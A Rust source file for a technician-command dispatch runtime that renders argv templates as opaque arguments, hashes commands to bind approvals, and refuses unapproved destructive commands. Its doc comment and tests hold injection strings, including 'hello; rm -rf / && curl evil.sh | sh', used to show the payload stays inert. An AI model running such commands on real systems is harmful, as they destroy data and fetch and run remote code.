//! v2.39.0 — Remote Hands runtime: the pure, verifiable dispatch core for a
//! `target:`-bound technician `tool`, plus the wire protocol exchanged with a
//! local agent over the bound `socket`.
//!
//! **What lives here (OSS):** the security-critical, side-effect-free logic —
//! rendering the argv template with bound arguments as *opaque* values,
//! computing the template hash (the agent-side allowlist key, the design decision) and the
//! rendered-command hash (the confirmation binding, the design decision), verifying an
//! approval against that hash, and bounding the returned output. None
//! of this executes anything: the compiler/runtime never runs a shell.
//!
//! **What lives elsewhere:** the live WebSocket that carries these frames to a
//! connected agent is the enterprise data plane (it owns the connection state);
//! the actual `execve` of the rendered argv is the reference local agent
//! (v2.39.0). Both sides speak the frames defined below, and both re-check the
//! hashes — trust is mutual, not one-directional.
//!
//! The injection-safety property is realised HERE at runtime, not just at
//! compile time: `render_argv` substitutes each `${param}` as exactly one argv
//! element and never re-tokenises the value, so an argument like
//! `"; rm -rf /"` is a single inert argument to the program, not new syntax —
//! the same discipline `retrieve.where:` uses for SQL parameters (v2.33.0).

use crate::esk::provenance::to_hex;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use std::collections::BTreeMap;

use axon_frontend::ir_nodes::IRToolSpec;
use axon_frontend::technician::{classify_argv_token, ArgvToken, RISK_DESTRUCTIVE};

/// Default per-stream output ceiling (1 MiB) — a command that floods stdout can
/// neither OOM the runtime nor the agent. Overridable per enrollment.
pub const DEFAULT_OUTPUT_LIMIT: usize = 1024 * 1024;

/// Everything that can go wrong turning a technician tool + bound arguments
/// into a dispatchable command. Every variant is a *refusal to dispatch* — the
/// fail-closed posture the whole cycle depends on.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum TechError {
    /// An `${x}` in argv has no bound argument (should be impossible after
    /// `axon-T859`, re-checked here as defence in depth).
    UnboundPlaceholder(String),
    /// An argv element is a partial/fused placeholder (`"${x}.txt"`) — rejected
    /// so a value can never fuse with surrounding text (the design decision; `axon-T859`).
    PartialToken(String),
    /// A destructive command reached dispatch without an approval.
    ApprovalRequired,
    /// The approval's command hash does not match the rendered argv — a
    /// different command than the one the human approved (the design decision, anti-TOCTOU).
    ApprovalHashMismatch { approved: String, actual: String },
    /// The tool is not a technician tool (no `target:`), so it cannot dispatch
    /// over a socket.
    NotATechnicianTool,
}

impl std::fmt::Display for TechError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TechError::UnboundPlaceholder(p) => {
                write!(f, "argv placeholder '${{{p}}}' has no bound argument")
            }
            TechError::PartialToken(t) => {
                write!(f, "argv element '{t}' is a partial/fused placeholder")
            }
            TechError::ApprovalRequired => {
                write!(f, "destructive command requires an approval before dispatch")
            }
            TechError::ApprovalHashMismatch { approved, actual } => write!(
                f,
                "approval hash mismatch: approved {approved}, about to run {actual}"
            ),
            TechError::NotATechnicianTool => {
                write!(f, "tool has no `target:` — not a technician command")
            }
        }
    }
}

impl std::error::Error for TechError {}

/// Hex SHA-256 of an argv vector's canonical (NUL-separated) bytes. Element
/// boundaries are forgery-proof (a value cannot fake a boundary), so two
/// different argv vectors never collide on structure. Used for BOTH the
/// template hash and the rendered-command hash.
pub fn hash_argv(argv: &[String]) -> String {
    let mut h = Sha256::new();
    h.update(axon_frontend::technician::argv_canonical_bytes(argv));
    to_hex(&h.finalize())
}

/// A fully-rendered, ready-to-dispatch technician command — the artifact the
/// enterprise serving layer sends to the agent and audits.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct DispatchPlan {
    pub tool_name: String,
    pub target_socket: String,
    pub risk: String,
    /// The argv AFTER substitution — each element an opaque, ready-to-exec
    /// argument. This is what the agent execs (never a shell string).
    pub argv: Vec<String>,
    /// Hex SHA-256 of the *template* argv (pre-substitution) — the key the
    /// agent checks against its enrollment allowlist.
    pub template_hash: String,
    /// Hex SHA-256 of the *rendered* argv — the value an approval binds to
    ///. The runtime refuses to run anything whose rendered argv does
    /// not hash to what was approved.
    pub command_hash: String,
    /// `true` iff `risk == destructive`: dispatch must be gated on an approval.
    pub requires_confirmation: bool,
}

/// Substitute bound arguments into a technician tool's argv template, producing
/// a concrete argv vector. Each `${param}` becomes ONE element = the bound
/// value, verbatim and opaque (never re-tokenised). Literals pass through.
/// Fails closed on an unbound or partial placeholder.
pub fn render_argv(
    argv_template: &[String],
    args: &BTreeMap<String, String>,
) -> Result<Vec<String>, TechError> {
    let mut out = Vec::with_capacity(argv_template.len());
    for tok in argv_template {
        match classify_argv_token(tok) {
            ArgvToken::Literal(lit) => out.push(lit),
            ArgvToken::Placeholder(name) => match args.get(&name) {
                Some(v) => out.push(v.clone()),
                None => return Err(TechError::UnboundPlaceholder(name)),
            },
            ArgvToken::Partial(t) => return Err(TechError::PartialToken(t)),
        }
    }
    Ok(out)
}

/// Render a technician tool + bound arguments into a [`DispatchPlan`]. This is
/// the single entry point the serving layer calls before it touches the wire.
pub fn plan_dispatch(
    tool: &IRToolSpec,
    args: &BTreeMap<String, String>,
) -> Result<DispatchPlan, TechError> {
    let target_socket = tool.target.clone().ok_or(TechError::NotATechnicianTool)?;
    let risk = tool.risk.clone().unwrap_or_default();
    let argv = render_argv(&tool.argv, args)?;
    Ok(DispatchPlan {
        tool_name: tool.name.clone(),
        target_socket,
        template_hash: hash_argv(&tool.argv),
        command_hash: hash_argv(&argv),
        requires_confirmation: risk == RISK_DESTRUCTIVE,
        risk,
        argv,
    })
}

/// Verify that a plan is cleared to dispatch. A safe command always is; a
/// destructive command needs an approval whose `command_hash` matches the plan
/// exactly. `approved_hash == None` on a destructive command is a
/// refusal, not a default-allow (fail-closed).
pub fn authorize_dispatch(
    plan: &DispatchPlan,
    approved_hash: Option<&str>,
) -> Result<(), TechError> {
    if !plan.requires_confirmation {
        return Ok(());
    }
    match approved_hash {
        None => Err(TechError::ApprovalRequired),
        Some(h) if h == plan.command_hash => Ok(()),
        Some(h) => Err(TechError::ApprovalHashMismatch {
            approved: h.to_string(),
            actual: plan.command_hash.clone(),
        }),
    }
}

/// Bound one output stream to `limit` bytes, returning the (possibly truncated)
/// text and whether truncation occurred. Truncation respects UTF-8
/// char boundaries so the result is always valid text.
pub fn bound_output(raw: &str, limit: usize) -> (String, bool) {
    if raw.len() <= limit {
        return (raw.to_string(), false);
    }
    let mut end = limit;
    while end > 0 && !raw.is_char_boundary(end) {
        end -= 1;
    }
    (raw[..end].to_string(), true)
}

// ── Wire protocol (axon ⇄ local agent) ───────────────────────────────────────

/// axon → agent: run this exact argv. Carries the `template_hash` so the agent
/// can check its allowlist and the `command_id` so the result can be
/// correlated. NO shell string is ever transmitted — only the argv vector.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TechDispatchFrame {
    pub command_id: String,
    pub tool_name: String,
    pub argv: Vec<String>,
    pub template_hash: String,
    pub risk: String,
    pub timeout_ms: u64,
    pub stdout_limit: usize,
    pub stderr_limit: usize,
}

/// agent → axon: the bounded, typed result of one command.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TechResultFrame {
    pub command_id: String,
    pub stdout: String,
    pub stderr: String,
    pub exit_code: i32,
    /// `true` iff either stream was truncated to its limit.
    pub truncated: bool,
}

/// agent → axon: an explicit refusal (e.g. the template hash was not in the
/// agent's allowlist — the design decision). A refusal is a first-class outcome, never
/// silence.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct TechRefusalFrame {
    pub command_id: String,
    /// A closed reason slug: `template_not_allowed | privilege_denied |
    /// unsupported`.
    pub reason: String,
    pub detail: String,
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tech_tool(argv: &[&str], risk: &str, params: &[&str]) -> IRToolSpec {
        IRToolSpec {
            node_type: "tool_spec",
            source_line: 1,
            source_column: 1,
            name: "T".to_string(),
            provider: "bash".to_string(),
            max_results: None,
            filter_expr: String::new(),
            timeout: "5s".to_string(),
            runtime: String::new(),
            resource_ref: String::new(),
            sandbox: None,
            input_schema: Vec::new(),
            output_schema: String::new(),
            parameters: params
                .iter()
                .map(|p| axon_frontend::ir_nodes::IRToolParam {
                    name: p.to_string(),
                    type_name: "String".to_string(),
                    optional: false,
                })
                .collect(),
            output_type: None,
            requires: Vec::new(),
            secret: String::new(),
            secret_partition: String::new(),
            effect_row: Vec::new(),
            target: Some("TechSafeWS".to_string()),
            risk: Some(risk.to_string()),
            argv: argv.iter().map(|s| s.to_string()).collect(),
            cache: String::new(),
            scrape: None,
        }
    }

    fn args(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs.iter().map(|(k, v)| (k.to_string(), v.to_string())).collect()
    }

    #[test]
    fn renders_placeholders_as_opaque_single_elements() {
        let tool = tech_tool(&["ping", "-c", "${count}", "${host}"], "safe", &["count", "host"]);
        let plan = plan_dispatch(&tool, &args(&[("count", "4"), ("host", "example.com")])).unwrap();
        assert_eq!(plan.argv, vec!["ping", "-c", "4", "example.com"]);
    }

    #[test]
    fn injection_attempt_stays_a_single_inert_argument() {
        // The whole point: a shell-injection payload is ONE argv element, not
        // new syntax. `rm` never sees a `;` as a command separator here.
        let tool = tech_tool(&["echo", "${msg}"], "safe", &["msg"]);
        let evil = "hello; rm -rf / && curl evil.sh | sh";
        let plan = plan_dispatch(&tool, &args(&[("msg", evil)])).unwrap();
        assert_eq!(plan.argv, vec!["echo".to_string(), evil.to_string()]);
        assert_eq!(plan.argv.len(), 2, "payload must not split into more args");
    }

    #[test]
    fn unbound_placeholder_fails_closed() {
        let tool = tech_tool(&["ping", "${host}"], "safe", &["host"]);
        assert_eq!(
            render_argv(&tool.argv, &args(&[])),
            Err(TechError::UnboundPlaceholder("host".to_string()))
        );
    }

    #[test]
    fn safe_command_needs_no_approval() {
        let tool = tech_tool(&["ls", "${dir}"], "safe", &["dir"]);
        let plan = plan_dispatch(&tool, &args(&[("dir", "/tmp")])).unwrap();
        assert!(!plan.requires_confirmation);
        assert_eq!(authorize_dispatch(&plan, None), Ok(()));
    }

    #[test]
    fn destructive_without_approval_is_refused() {
        let tool = tech_tool(&["rm", "${path}"], "destructive", &["path"]);
        let plan = plan_dispatch(&tool, &args(&[("path", "/tmp/x")])).unwrap();
        assert!(plan.requires_confirmation);
        assert_eq!(authorize_dispatch(&plan, None), Err(TechError::ApprovalRequired));
    }

    #[test]
    fn destructive_with_matching_approval_is_authorized() {
        let tool = tech_tool(&["rm", "${path}"], "destructive", &["path"]);
        let plan = plan_dispatch(&tool, &args(&[("path", "/tmp/x")])).unwrap();
        assert_eq!(authorize_dispatch(&plan, Some(&plan.command_hash)), Ok(()));
    }

    #[test]
    fn approval_bound_to_a_different_command_is_rejected() {
        // The human approved `rm /tmp/x`; a compromised plane tries `rm /`.
        let tool = tech_tool(&["rm", "${path}"], "destructive", &["path"]);
        let approved = plan_dispatch(&tool, &args(&[("path", "/tmp/x")])).unwrap();
        let swapped = plan_dispatch(&tool, &args(&[("path", "/")])).unwrap();
        match authorize_dispatch(&swapped, Some(&approved.command_hash)) {
            Err(TechError::ApprovalHashMismatch { .. }) => {}
            other => panic!("expected hash mismatch, got {other:?}"),
        }
    }

    #[test]
    fn template_hash_is_stable_across_argument_values() {
        let tool = tech_tool(&["rm", "${path}"], "destructive", &["path"]);
        let a = plan_dispatch(&tool, &args(&[("path", "/tmp/a")])).unwrap();
        let b = plan_dispatch(&tool, &args(&[("path", "/tmp/b")])).unwrap();
        assert_eq!(a.template_hash, b.template_hash, "allowlist key is the template");
        assert_ne!(a.command_hash, b.command_hash, "confirmation binds the value");
    }

    /// v2.39.0 KNOWN-ANSWER VECTOR — the canonical argv hash. The enterprise
    /// data plane and the reference agent recompute this scheme independently
    /// (NUL-separated argv → SHA-256 → lowercase hex); this exact vector is
    /// duplicated in `axon-enterprise/crates/server/src/technician.rs` so any
    /// drift between the two implementations fails a test in one repo. DO NOT
    /// change without updating the enterprise copy (they must agree byte-for-
    /// byte or a confirmation hash would never match — the design decision).
    #[test]
    fn canonical_argv_hash_known_answer_vector() {
        assert_eq!(
            hash_argv(&["rm".to_string(), "/tmp/x".to_string()]),
            "41fc42545e64d1f23b39293ae1b489273ac31bb51097e3397aef1fcb70f2804d"
        );
        assert_eq!(
            hash_argv(&[
                "ping".to_string(),
                "-c".to_string(),
                "4".to_string(),
                "example.com".to_string()
            ]),
            "9a0d9084142e5ee8e029d47205b05fe82ec28e424ff6d3be64c1e2769e51cc4c"
        );
    }

    #[test]
    fn output_is_bounded_with_truncation_flag() {
        let (s, truncated) = bound_output("hello world", 5);
        assert_eq!(s, "hello");
        assert!(truncated);
        let (s2, t2) = bound_output("hi", 100);
        assert_eq!(s2, "hi");
        assert!(!t2);
    }
}
